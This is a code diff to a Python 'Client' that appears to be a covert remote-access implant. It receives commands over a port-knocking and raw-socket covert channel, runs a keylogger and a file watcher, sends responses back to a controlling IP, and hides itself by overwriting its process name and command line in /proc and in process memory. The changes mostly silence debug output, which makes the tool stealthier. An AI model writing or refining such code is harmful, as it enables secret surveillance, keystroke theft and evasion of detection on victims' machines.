@@ -216,11 +216,11 @@ class Client:
                         state['current_command'] = command_code
                         state['current_src_ip'] = src_ip
                         state['chunks'] = {}
-                        print(f"\nReceiving covert command from {src_ip}")
-                        print(f"    Expected packets: {total}")
+                        # print(f"\nReceiving covert command from {src_ip}")
+                        # print(f"    Expected packets: {total}")
 
-                    print(f"[DEBUG] seq={seq}/{state['expected_total']} "
-                          f"cmd=0x{command_code:04X}")
+                    # print(f"[DEBUG] seq={seq}/{state['expected_total']} "
+                    #       f"cmd=0x{command_code:04X}")
 
                     state['chunks'][seq] = data
 
@@ -257,7 +257,7 @@ class Client:
                             continue
 
                         print(f"\nCovert command received from {state['current_src_ip']}")
-                        print(f"    Command:      {command_type.name}")
+                        print(f"    Command: {command_type.name}")
                         print(f"    Payload size: {len(payload)} bytes")
 
                         src = state['current_src_ip']
@@ -378,7 +378,7 @@ class Client:
                     watch_path = filepath
                     recursive = True
 
-                print(f"[DEBUG] target_file={target_file!r} watch_path={watch_path!r} recursive={recursive}")
+                # print(f"[DEBUG] target_file={target_file!r} watch_path={watch_path!r} recursive={recursive}")
 
                 ignore_exts = {'.swp', '.swx', '.tmp', '~'}
                 event_mask = (
@@ -596,7 +596,7 @@ class Client:
     def _stop_file_watcher(self):
         """Stop the active file watcher thread if running."""
         if self._watcher_thread and self._watcher_thread.is_alive():
-            print("Stopping existing file watcher...")
+            print("Stopping file watcher...")
             self._watcher_stop.set()
             self._watcher_thread.join(timeout=3)
             self._watcher_thread = None
@@ -605,7 +605,7 @@ class Client:
     def _stop_keylogger(self):
         """Stop the active file watcher thread if running."""
         if self._keylogger_thread and self._keylogger_thread.is_alive():
-            print("Stopping existing keylogger...")
+            print("Stopping keylogger...")
             self._keylogger_stop.set()
             self._keylogger_thread.join(timeout=3)
             self._keylogger_thread = None
@@ -621,9 +621,9 @@ class Client:
                 command_type,
                 payload
             )
-            print(f"    Response sent to {dst_ip}")
+            # print(f"    Response sent to {dst_ip}")
         except Exception as e:
-            print(f"    Failed to send response: {e}")
+            print(f"Failed to send response: {e}")
 
     def get_local_ip(self):
         try:
@@ -636,7 +636,6 @@ class Client:
             return "127.0.0.1"
 
     def start(self):
-        print("Client - Port Knock + Raw Socket Covert Channel")
         print(f"Knock sequence: {self.knock_sequence}")
         print(f"Knock timeout:  {self.knock_timeout}s")
         print(f"Command port:   UDP {self.command_port}")
@@ -683,13 +682,13 @@ def most_common_process():
     return name
 
 
-def conceal_process_name(name: str):
+def conceal_process_name(name):
     # Set /proc/PID/comm (shown by ps -a, top, htop)
     try:
         with open(f"/proc/{os.getpid()}/comm", "w") as f:
             f.write(name[:15])
     except OSError as e:
-        print(f"[!] Could not set comm: {e}")
+        print(f"Could not set comm: {e}")
 
     # Overwrite /proc/PID/cmdline (shown by ps -aux, ps -ef)
     try:
@@ -735,7 +734,6 @@ def conceal_process_name(name: str):
             with open(mem_file, "wb") as mem:
                 mem.seek(cmdline_addr)
                 mem.write(replacement)
-            print(f"cmdline overwritten at 0x{cmdline_addr:x}")
         else:
             print("Could not locate argv[0] in stack — cmdline not overwritten")
 
